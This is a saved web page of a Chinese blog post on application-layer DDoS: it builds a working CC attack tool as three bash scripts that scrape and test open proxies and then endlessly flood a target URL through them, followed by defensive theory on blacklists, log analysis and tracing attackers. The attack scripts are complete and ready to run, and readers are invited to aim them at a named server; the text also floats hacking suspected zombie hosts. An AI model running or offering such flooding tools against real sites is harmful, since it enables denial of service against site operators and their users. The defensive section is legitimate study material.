@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>DDoS攻防战（二）：CC攻击工具实现与防御理论</title>
+    <meta name="viewport" content="width=device-width">
+    <meta name="description" content="IT互联网干货汇总">
+    <link rel="canonical" href="http://iftti.com/posts/2014/2014-07-07-72928-17974e8b2.html">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/main.css">
+
+</head>
+
+    <body>
+
+    <header class="site-header">
+
+  <div class="wrap">
+
+    <a class="site-title" href="/">IT干货网</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+           viewBox="0 0 18 15" enable-background="new 0 0 18 15" xml:space="preserve">
+          <path fill="#505050" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0
+            h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#505050" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484
+            h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#505050" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0
+            c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+      <div class="trigger">
+
+          <a class="page-link" href="/about/">About</a>
+
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+    <div class="page-content">
+      <div class="wrap">
+      <div class="post">
+
+  <header class="post-header">
+    <h1>DDoS攻防战（二）：CC攻击工具实现与防御理论</h1>
+    <p class="meta"><span class="time">Jul 7, 2014</span><span class="source_url"> • <a name="jobbole.com" href="http://blog.jobbole.com/72928/" target="_blank">[jobbole.com]</a></span></p>
+    <p><!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+	<span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_evernote">EverNote</a>
+	<a class="jiathis_button_pocket">Pocket</a>
+	<a class="jiathis_button_tsina">新浪微博</a>
+	<a class="jiathis_button_renren">人人网</a>
+	<a class="jiathis_button_weixin">微信</a>
+	<a class="jiathis_button_cqq">QQ好友</a>
+	<a class="jiathis_button_googleplus">Google+</a>
+	<a href="http://www.jiathis.com/share?uid=1936498" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1936498" charset="utf-8"></script>
+<!-- JiaThis Button END --></p>
+  </header>
+
+  <article class="post-content">
+
+<!-- div id="ad1">
+<script type="text/javascript">
+google_ad_client = "ca-pub-7056282119617872";
+google_ad_slot = "6645040531";
+google_ad_width = 300;
+google_ad_height = 250;
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+<br/ -->
+
+<p>我们将要实现一个进行应用层DDoS攻击的工具，综合考虑，CC攻击方式是最佳选择，并用bash shell脚本来快速实现并验证这一工具，并在最后，讨论如何防御来自应用层的DDoS攻击。</p>
+<p><strong>第一步：获取大量可用代理ip:port列表</strong></p>
+<p>网上所处可见免费代理，我们使用http的GET方法抓取html文档，接着使用正则过滤出我们需要的ip port对，然后逐一验证各代理的可用性，最终得到可用的代理ip port对。</p>
+<pre class="brush: c; gutter: true"> grab_proxy.sh
+#!/bin/bash
+
+#get proxy list
+declare proxyListFile="proxy.txt"
+declare tmpFile=`mktemp`
+declare url
+declare line
+declare times
+declare ip
+declare port
+declare i
+declare j
+declare mod
+
+function quit() {
+    rm -f $tmpFile
+    exit "$1"
+}
+
+echo "get proxy list... please wait..."
+
+if [ -r "$proxyListFile" ]
+then
+  rm -f $proxyListFile
+fi
+
+touch $proxyListFile
+
+for url in  " http://www.youdaili.cn/Daili/guonei/2215.html " \
+            " http://www.youdaili.cn/Daili/guonei/2215_2.html" \
+            " http://www.youdaili.cn/Daili/guonei/2215_3.html" \
+            " http://www.youdaili.cn/Daili/guonei/2215_4.html "
+do
+    if GET "$url" &gt; $tmpFile
+    then
+        grep -oE '^.*&lt;br /&gt;.*$' "$tmpFile" | grep -Eo "([0-9]+)(\.[0-9]+){3}:([0-9]+)" \
+        | sort -n | uniq | awk -F: '{ printf("%-15s  %s \n",$1,$2); }' &gt;&gt; $proxyListFile
+    else
+        exec 1&gt;&amp;2
+        echo "error: get proxy list fail! chech the url:$url or the network"
+        quit 1
+    fi
+done
+
+echo "done. total `cat $proxyListFile | wc -l` proxy"
+
+quit 0
+#exit</pre>
+
+<p>参数：</p>
+<p>declare proxyListFile=”proxy.txt”  #抓取到的代理ip port对所存放的文件路径</p>
+<p><a href="http://jbcdn2.b0.upaiyun.com/2014/07/77e43d48ddd7bf2a041c76ed9a8639c2.png" rel="lightbox[72928]" title="DDoS攻防战（二）：CC攻击工具实现与防御理论"><img class="alignnone size-full wp-image-72929" alt="041056016452998" src="http://jbcdn2.b0.upaiyun.com/2014/07/77e43d48ddd7bf2a041c76ed9a8639c2.png"></a></p>
+<p> </p>
+<pre class="brush: c; gutter: true"> check_proxy.sh
+#!/bin/bash
+
+#get proxy list
+declare check_threads=10
+declare line
+declare times
+declare ip
+declare port
+declare i
+declare j
+declare mod
+
+function quit() {
+    exit "$1"
+}
+
+#echo "start check proxy's functionality..."
+
+#retarget the input file to stdin
+if [ "$#" -gt "0" ]
+then
+    exec 0&lt;$1
+else
+    exec 1&gt;&amp;2
+    echo "usage: bash $0 proxyListFile.txt"
+    echo "error: must have one input arg"
+    quit 1
+fi
+
+#check proxy's functionality
+times=0
+while read line
+do
+    times=$((times+1))
+    j=0
+    for i in `echo $line | tr ' ' '\n' | grep -E '^[^\s].*$'`
+    do
+        j=$((j+1))
+        if [ "$j" -eq 1 ]
+        then
+            ip=$i
+        else
+            port=$i
+        fi
+    done
+    #echo "times=$times ip=$ip port=$port"
+    # start test
+    if GET -t 5 -p "http://$ip:$port" "http://baidu.com" &amp;&gt;/dev/null
+    then 
+        echo "$ip $port"
+        echo ":) ip=$ip port=$port " &amp;&gt;/dev/null
+    else
+        echo "invalid ip=$ip port=$port : please check ip:host or network" &amp;&gt;/proc/self/fd/2
+    fi &amp;
+    mod=$((times%check_threads))
+    if [ "$mod" -eq "0" ]
+    then
+        wait
+    fi
+done
+
+#close the fd of input file
+exec 0&gt;&amp;-
+quit 0
+#exit</pre>
+
+<p>参数：</p>
+<p>declare check_threads=10 #验证代理可用性时的并发数，看一下代码就会发现，我们使用的是GET http://baidu.com方法，所以，并发数请不要也太高 :) 除非你的目标就是……</p>
+<p><a href="http://jbcdn2.b0.upaiyun.com/2014/07/e0c058e362f900a0901c3f3be14e86eb.png" rel="lightbox[72928]" title="DDoS攻防战（二）：CC攻击工具实现与防御理论"><img class="alignnone size-full wp-image-72930" alt="041104385362485" src="http://jbcdn2.b0.upaiyun.com/2014/07/e0c058e362f900a0901c3f3be14e86eb.png"></a></p>
+<p> </p>
+<p>总结：应征入伍的士兵共计600人，经过考核的共计449人，如果你还想招募更多的士兵，奉劝一句，苦海无边，回头是岸。<br>
+<strong>第二步：吹响战争号角</strong></p>
+<p>笔者在一台VPS上建立了一个薄弱的靶机，各位读者请不要太暴力，测试一下就可以了，地址 http://eecs.cc:8080/</p>
+<p><a href="http://jbcdn2.b0.upaiyun.com/2014/07/811e17070d500a61dafb2c62bb3f8aed.png" rel="lightbox[72928]" title="DDoS攻防战（二）：CC攻击工具实现与防御理论"><img class="alignnone size-full wp-image-72931" alt="041127125528891" src="http://jbcdn2.b0.upaiyun.com/2014/07/811e17070d500a61dafb2c62bb3f8aed.png"></a></p>
+<p> </p>
+<p>笔者把这么重要的信息都放出来了，读者请点个赞吧  <strong>:)</strong></p>
+<pre class="brush: c; gutter: true">cc.sh
+#!/bin/bash
+
+declare target_url="http://eecs.cc:8080/"
+declare get_timeout_sec=5
+declare line
+declare times
+declare ip
+declare port
+declare i
+declare j
+
+function quit() {
+    exit "$1"
+}
+
+#retarget the input file to stdin
+if ! [ "$#" -gt "0" ]
+then
+    exec 1&gt;&amp;2
+    echo "challenge collapsar attack -- cc attack"
+    echo "usage: bash $0 proxyListFile.txt"
+    echo "error: must have one input arg"
+    quit 1
+fi
+
+echo "report : total `cat $1 | wc -l` proxy-soldiers are ready for command"
+echo "command: target: $target_url"
+echo "command: start challenge collapsar attack   :)   amazing..."
+
+exec 0&lt;$1
+#start challenge collapsar attack
+
+while true
+do
+    times=0
+    exec 0&lt;&amp;-
+    exec 0&lt;$1
+    while read line
+    do
+        times=$((times+1))
+        j=0
+        for i in `echo $line | tr ' ' '\n' | grep -E '^[^\s].*$'`
+        do
+            j=$((j+1))
+            if [ "$j" -eq 1 ]
+            then
+                ip=$i
+            else
+                port=$i
+            fi
+        done
+        echo "times=$times ip=$ip port=$port"
+        #single soldier attack
+        if GET -t "$get_timeout_sec" -p "http://$ip:$port" "$target_url" &amp;&gt;/dev/null 
+        then 
+            echo "soldier$times attack $target_url :)"
+        else
+            echo "soldier$times attack $target_url miss"
+        fi &amp;
+    done
+    wait
+done
+
+#close the fd of input file
+exec 0&gt;&amp;-
+quit 0
+#exit</pre>
+
+<p><a href="http://jbcdn2.b0.upaiyun.com/2014/07/bf67c68ed3a4be73358dd3e54201bb3b.png" rel="lightbox[72928]" title="DDoS攻防战（二）：CC攻击工具实现与防御理论"><img class="alignnone size-full wp-image-72932" alt="041139274425845" src="http://jbcdn2.b0.upaiyun.com/2014/07/bf67c68ed3a4be73358dd3e54201bb3b.png"></a><br>
+读者可自行尝试攻击这个站点，然后使用浏览器访问查看服务器网络状况，此时大量连接处于TIME_WAIT状态，参考TCP状态机，这一状态为主动关闭一方的最终等待状态。</p>
+<p><strong>请不要恶意攻击别人的网站 如果因此被关了进去 没有人能把你弄出来</strong></p>
+<p><strong>  </strong></p>
+<p><strong>  应用层DDoS的防御理论：</strong></p>
+<p><strong>  问题模型描述：</strong></p>
+<p><strong>  </strong>每一个页面，都有其资源消耗权重，静态资源，权重较低，动态资源，权重较高。对于用户访问，有如下：</p>
+<p>用户资源使用频率=使用的服务器总资源量/s</p>
+<p><strong>  命题一：对于正常访问的用户，资源使用频率必定位于一个合理的范围，当然会存在大量正常用户共享ip的情况，这就需要日常用户访问统计，以得到忠实用户ip白名单。</strong></p>
+<p><strong>  命题二：资源使用频率持续异常的，可断定为访问异常的用户。</strong></p>
+<p> </p>
+<p><strong>  防御体系状态机：</strong></p>
+<p><strong>  1.在系统各项资源非常宽裕时，向所有ip提供服务，每隔一段时间释放一部分临时黑名单中的ip成员；</strong></p>
+<p><strong>  2.在系统资源消耗达到某一阈值时，降低Syn包接受速率，循环：分析最近时间的日志，并将访问异常的ip加入临时黑名单；</strong></p>
+<p><strong>  3.若系统资源消耗慢慢回降至正常水平，则恢复Syn包接受速率，转到状态1；若目前策略并未有效地控制住系统资源消耗的增长，情况继续恶劣至一极限阈值，转到状态4；</strong></p>
+<p><strong>  4.最终防御方案，使用忠实用户ip白名单、异常访问ip黑名单策略，其他访问可慢慢放入，直到系统资源消耗回降至正常水平，转到状态1。</strong></p>
+<p><strong> </strong></p>
+<p><strong> 上述的<strong>防御状态机，对于单个攻击IP高并发的DDOS，变化到状态3时，效果就完全体现出来了，但</strong>如果防御状态机进行到4状态，则有如下两种可能：</strong></p>
+<p><strong>  </strong>1.站点遭到了攻击群庞大的、单个IP低并发的DDOS攻击；</p>
+<p>2.站点突然间有了很多访问正常的新用户。</p>
+<p><strong> 建议后续工作：</strong></p>
+<p><strong>  </strong>保守：站点应尽快进行服务能力升级。</p>
+<p>积极：尽所能，追溯攻击者。</p>
+<p><strong>  追溯攻击者：</strong><br>
+<strong>    </strong>CC：proxy-forward-from-ip<br>
+单个IP高并发的DDOS：找到访问异常的、高度可疑的ip列表，exploit，搜集、分析数据，因为一个傀儡主机可被二次攻占的概率很大（但不建议这种方法）<br>
+单个IP低并发的DDOS：以前极少访问被攻击站点，但是在攻击发生时，却频繁访问我们的站点，分析日志得到这一部分ip列表</p>
+<p><strong>   追溯攻击者的过程中，snat与web proxy增加了追踪的难度，如果攻击者采用多个中继服务器的方法，追溯将变得极为困难。</strong></p>
+<p><strong>      </strong></p>
+<p><strong>防御者：</strong></p>
+<ul>
+<li>1.应对当前系统了如指掌，如系统最高负载、最高数据处理能力，以及系统防御体系的强项与弱点</li>
+<li>2.历史日志的保存、分析</li>
+<li>3.对当前系统进行严格安全审计</li>
+<li>4.上报公安相关部分，努力追溯攻击者</li>
+<li>5.网站，能静态，就一定不要动态，可采取定时从主数据库生成静态页面的方式，对需要访问主数据库的服务使用验证机制。</li>
+<li>6.防御者应能从全局的角度，迅速及时地发现系统正在处于什么程度的攻击、何种攻击，在平时，应该建立起攻击应急策略，规范化操作，免得在急中犯下低级错误</li>
+</ul>
+<p><strong>对历史日志的分析这时将会非常重要，数据可视化与统计学的方法将会很有益处：</strong></p>
+<p>1.分析每个页面的平均访问频率</p>
+<p>2.对访问频率异常的页面进行详细分析 分析得到ip-页面访问频率</p>
+<p>3.得到对访问异常页面的访问异常ip列表</p>
+<p>4.对日志分析得到忠实用户IP白名单</p>
+<p>5.一般一个页面会关联多个资源，一次对于这样的页面访问往往会同时增加多个资源的访问数，而攻击程序一般不会加载这些它不感兴趣的资源，所以，这也是一个非常好的分析突破点</p>
+<p> </p>
+<p>本文主要讲述了DDoS攻击之一的CC攻击工具实现，以及如何防御来自应用层的DDoS攻击的理论总结。接下来的文章，笔者将会实现一个工作于内核态的、具有黑名单功能的防火墙模块，以对应于上述防御状态机中的防火墙单元，它实现了自主地动态内存管理，使用hash表管理ip列表，并可以自定义hash表的modular。</p>
+<p><strong>附录：</strong></p>
+<p><strong>《<a href="http://blog.jobbole.com/72919/" target="_blank">DDoS攻防战 （一） ： 概述</a><br>
+</strong></p>
+
+<!-- div id="ad1">
+</div -->
+
+<p><a target="_blank" rel="nofollow" href="http://www.jobdeer.com/?fr=jobbole"></a></p>
+
+  </article>
+
+  <div class="meta">
+
+    <a class="basic-alignment left" href="/posts/2014/2014-07-07-72850-f8e0d7124.html" title="Previous Post: 可视化对比十多种排序算法（C#版）" data-instant>&laquo; 可视化对比十多种排序算法（C#版）</a>
+
+    <a class="basic-alignment right" href="/posts/2014/2014-07-08-73127-ce4c7bb64.html" title="Next Post: 数据库的最简单实现" data-instant>数据库的最简单实现 &raquo;</a>
+
+</div>
+  <div id="related">
+  <h2 class="subheader">Related Posts <small>They might be useful</small></h2>
+  <ul class="posts">
+
+      <li><span>17 Jul 2014</span> &raquo; <a href="http://iftti.com/posts/2014/2014-07-17-73257-503521781.html">BASH的保护性编程技巧</a></li>
+
+      <li><span>07 Jul 2014</span> &raquo; <a href="http://iftti.com/posts/2014/2014-07-07-72850-f8e0d7124.html">可视化对比十多种排序算法（C#版）</a></li>
+
+      <li><span>10 Jul 2014</span> &raquo; <a href="http://iftti.com/posts/2014/2014-07-10-72935-d195773f0.html">DDoS攻防战（三）：ip黑白名单防火墙frdev的原理与实现</a></li>
+
+  </ul>
+</div>
+
+<comments>
+
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=1936498"></script>
+<!-- UY END -->
+
+</comments>
+
+</div>
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrap">
+
+    <h2 class="footer-heading">IT干货网</h2>
+
+    <div class="footer-col-1 column">
+      <ul>
+        <li>科技与互联网信息</li>
+        <li>Liu Lantao</li>
+        <li><a href="mailto:iftti@iftti.com">iftti@iftti.com</a></li>
+      </ul>
+    </div>
+
+    <div class="footer-col-2 column">
+      <ul>
+        <li>
+          <a href="https://github.com/Lax">
+            <span class="icon github">
+              <svg version="1.1" class="github-icon-svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                 viewBox="0 0 16 16" enable-background="new 0 0 16 16" xml:space="preserve">
+                <path fill-rule="evenodd" clip-rule="evenodd" fill="#C2C2C2" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761
+                c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32
+                c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472
+                c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037
+                C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65
+                c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261
+                c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082
+                c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129
+                c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+              </svg>
+            </span>
+            <span class="username">Lax</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://twitter.com/liulantao">
+            <span class="icon twitter">
+              <svg version="1.1" class="twitter-icon-svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                 viewBox="0 0 16 16" enable-background="new 0 0 16 16" xml:space="preserve">
+                <path fill="#C2C2C2" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809
+                c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27
+                c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767
+                c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206
+                C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271
+                c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469
+                c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
+              </svg>
+            </span>
+            <span class="username">@liulantao</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://plus.google.com/+LiuLantao">
+            <span class="icon googleplus">
+              <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+                width="16px" height="16px" viewBox="0 0 134.658 131.646" enable-background="new 0 0 134.658 131.646"
+                xml:space="preserve">
+                <g>
+                  <path fill="#C2C2C2" d="M126.515,4.109H8.144c-2.177,0-3.94,1.763-3.94,3.938v115.546c0,2.179,1.763,3.942,3.94,3.942h118.371
+                  c2.177,0,3.94-1.764,3.94-3.942V8.048C130.455,5.872,128.691,4.109,126.515,4.109z"/>
+                  <g>
+                    <path fill="#FFFFFF" d="M70.479,71.845l-3.983-3.093c-1.213-1.006-2.872-2.334-2.872-4.765c0-2.441,1.659-3.993,3.099-5.43
+                    c4.64-3.652,9.276-7.539,9.276-15.73c0-8.423-5.3-12.854-7.84-14.956h6.849l7.189-4.517H60.418
+                    c-5.976,0-14.588,1.414-20.893,6.619c-4.752,4.1-7.07,9.753-7.07,14.842c0,8.639,6.633,17.396,18.346,17.396
+                    c1.106,0,2.316-0.109,3.534-0.222c-0.547,1.331-1.1,2.439-1.1,4.32c0,3.431,1.763,5.535,3.317,7.528
+                    c-4.977,0.342-14.268,0.893-21.117,5.103c-6.523,3.879-8.508,9.525-8.508,13.51c0,8.202,7.731,15.842,23.762,15.842
+                    c19.01,0,29.074-10.519,29.074-20.932C79.764,79.709,75.344,75.943,70.479,71.845z M56,59.107
+                    c-9.51,0-13.818-12.294-13.818-19.712c0-2.888,0.547-5.87,2.428-8.199c1.773-2.218,4.861-3.657,7.744-3.657
+                    c9.168,0,13.923,12.404,13.923,20.382c0,1.996-0.22,5.533-2.762,8.09C61.737,57.785,58.762,59.107,56,59.107z M56.109,103.65
+                    c-11.826,0-19.452-5.657-19.452-13.523c0-7.864,7.071-10.524,9.504-11.405c4.64-1.561,10.611-1.779,11.607-1.779
+                    c1.105,0,1.658,0,2.538,0.111c8.407,5.983,12.056,8.965,12.056,14.629C72.362,98.542,66.723,103.65,56.109,103.65z"/>
+                    <polygon fill="#FFFFFF" points="98.393,58.938 98.393,47.863 92.923,47.863 92.923,58.938 81.866,58.938 81.866,64.469
+                    92.923,64.469 92.923,75.612 98.393,75.612 98.393,64.469 109.506,64.469 109.506,58.938"/>
+                  </g>
+                </g>
+              </svg>
+            </span>
+            <span class="username">+LiuLantao</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="footer-col-3 column">
+      <p class="text">IT互联网干货汇总</p>
+    </div>
+
+  </div>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-1658815-7', 'iftti.com');
+  ga('require', 'displayfeatures');
+  ga('send', 'pageview');
+
+</script>
+
+</footer>
+
+    </body>
+</html>
